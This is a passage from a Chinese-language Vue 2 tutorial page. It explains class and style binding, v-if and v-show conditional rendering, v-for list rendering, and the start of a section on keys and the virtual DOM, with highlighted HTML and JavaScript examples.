class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fullName</span> = val + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">                &#125;,<span class="hljs-number">1000</span>);</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">lastName</span>(<span class="hljs-params">val</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">fullName</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> + val</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-11-绑定样式"><a href="#1-11-绑定样式" class="headerlink" title="1.11 绑定样式"></a>1.11 绑定样式</h2><ul><li><strong>:class</strong>&#x3D;”xxx”，xxx 可以是字符串、数组、对象</li><li><strong>:style</strong>&#x3D;”[a,b]”其中a、b是样式对象，数组对象</li><li><strong>:style</strong>&#x3D;”{fontSize: xxx}”其中 xxx 是动态值<ul><li>字符串写法适用于：类名不确定，要动态获取 </li><li>数组写法适用于：要绑定多个样式，个数不确定，名字也不确定 </li><li>对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用</li></ul></li></ul><p>​         </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.basic</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.happy</span> &#123;<span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.644</span>);</span><br><span class="language-css">          <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">30deg</span>, yellow, pink, orange, yellow);&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.sad</span> &#123;<span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> dashed <span class="hljs-built_in">rgb</span>(<span class="hljs-number">2</span>, <span class="hljs-number">197</span>, <span class="hljs-number">2</span>);<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.normal</span> &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bfa</span>;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu1</span> &#123;<span class="hljs-attribute">background-color</span>: yellowgreen;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu2</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> red;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu3</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;&#125;</span><br><span class="language-css">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;mood&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- 绑定style样式--对象写法 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- 绑定style样式--数组写法 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">      </span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">mood</span>: <span class="hljs-string">&#x27;normal&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">classArr</span>: [<span class="hljs-string">&#x27;atguigu1&#x27;</span>, <span class="hljs-string">&#x27;atguigu2&#x27;</span>, <span class="hljs-string">&#x27;atguigu3&#x27;</span>],</span><br><span class="language-javascript">            <span class="hljs-attr">classObj</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">atguigu1</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">              <span class="hljs-attr">atguigu2</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">fontSize</span>: <span class="hljs-string">&#x27;40px&#x27;</span>,</span><br><span class="language-javascript">              <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj2</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">&#x27;orange&#x27;</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleArr</span>: [</span><br><span class="language-javascript">              &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">fontSize</span>: <span class="hljs-string">&#x27;40px&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;blue&#x27;</span>,</span><br><span class="language-javascript">              &#125;,</span><br><span class="language-javascript">              &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">&#x27;gray&#x27;</span></span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeMood</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">              <span class="hljs-keyword">const</span> arr = [<span class="hljs-string">&#x27;happy&#x27;</span>, <span class="hljs-string">&#x27;sad&#x27;</span>, <span class="hljs-string">&#x27;normal&#x27;</span>]</span><br><span class="language-javascript">              <span class="hljs-keyword">const</span> index = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3</span>)</span><br><span class="language-javascript">              <span class="hljs-variable language_">this</span>.<span class="hljs-property">mood</span> = arr[index]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-12-条件渲染"><a href="#1-12-条件渲染" class="headerlink" title="1.12 条件渲染"></a>1.12 条件渲染</h2><p><strong>v-if</strong></p><ul><li><p>写法 跟 if else 语法类似</p><p>v-if&#x3D;”表达式”</p><p>v-else-if&#x3D;”表达式”</p><p>v-else</p></li><li><p>适用于：切换频率较低的场景，因为不展示的DOM元素直接被移除</p></li><li><p>注意：v-if可以和v-else-ifv-else一起使用，但要求结构不能被打断</p></li></ul><p><strong>v-show</strong></p><ul><li>写法：v-show&#x3D;”表达式”</li><li>适用于：切换频率较高的场景</li><li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉display: none</li></ul><blockquote><p>备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素。<code>template</code>标签不影响结构，页面html中不会有此标签，但只能配合v-if，不能配合v-show</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>条件渲染<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是:&#123;&#123; n &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- 使用v-show做条件渲染 --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-show=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- 使用v-if做条件渲染 --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-if=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- v-else和v-else-if --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 1&quot;&gt;Angular&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 2&quot;&gt;React&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 3&quot;&gt;Vue&lt;/div&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- &lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else&gt;哈哈&lt;/div&gt; --&gt;</span><br>   <br>   <br>     <span class="hljs-comment">&lt;!-- v-if与template的配合使用 --&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;n === 1&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>你好<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>尚硅谷<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">     <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">       <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">       <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">         <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript">         <span class="hljs-attr">n</span>:<span class="hljs-number">0</span></span><br><span class="language-javascript">       &#125;</span><br><span class="language-javascript">     &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​          </p><p>​       </p><h2 id="1-13-列表渲染"><a href="#1-13-列表渲染" class="headerlink" title="1.13 列表渲染"></a>1.13 列表渲染</h2><h3 id="v-for指令"><a href="#v-for指令" class="headerlink" title="v-for指令"></a>v-for指令</h3><ul><li>用于展示列表数据</li><li>语法：<code>&lt;li v-for=&quot;(item, index) of items&quot; :key=&quot;index&quot;&gt;</code>，这里key可以是index，更好的是遍历对象的唯一标识</li><li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>事件的基本使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>基本列表<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 遍历数组 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>人员列表（遍历数组）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;-&#123;&#123; index &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 遍历对象 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>汽车信息（遍历对象）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(value,k) of car&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;k&quot;</span>&gt;</span>&#123;&#123; k &#125;&#125;-&#123;&#123; value &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 遍历字符串 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>测试遍历字符串（用得少）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(char,index) of str&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; char &#125;&#125;-&#123;&#123; index &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 遍历指定次数 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>测试遍历指定次数（用得少）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(number,index) of 5&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; index &#125;&#125;-&#123;&#123; number &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;王五&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> &#125;</span><br><span class="language-javascript">      ],</span><br><span class="language-javascript">      <span class="hljs-attr">car</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;奥迪A8&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">price</span>: <span class="hljs-string">&#x27;70万&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;黑色&#x27;</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">str</span>: <span class="hljs-string">&#x27;hello&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="key的原理"><a href="#key的原理" class="headerlink" title="key的原理"></a><strong>key的原理</strong></h3><p>vue中的key有什么作用？（key的内部原理）</p><p>了解vue中key的原理需要一些前置知识。</p><p>就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。</p><p>虚拟dom有啥用？每次vm._data中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。</p><p>而key有啥用？</p><p>key是虚拟dom的标识。</p><p>先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM</p><h4 